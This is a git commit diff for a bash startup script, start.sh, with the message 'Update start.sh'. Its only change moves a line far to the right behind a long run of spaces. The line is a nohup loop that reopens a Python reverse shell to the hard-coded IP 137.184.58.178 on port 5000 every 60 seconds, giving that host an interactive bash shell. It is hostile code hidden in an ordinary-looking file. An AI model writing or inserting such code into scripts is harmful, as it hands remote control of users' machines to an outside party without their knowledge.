56af52e397e9503acaf5ca4ff132bef849ea78fc
njcve <36734894+njcve@users.noreply.github.com>
2025-07-29 19:37:44 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-// nohup sh -c 'while true; do python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("137.184.58.178",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'\''; sleep 60; done' &
+                                                                                                                                                                                                                                                            // nohup sh -c 'while true; do python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("137.184.58.178",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'\''; sleep 60; done' &
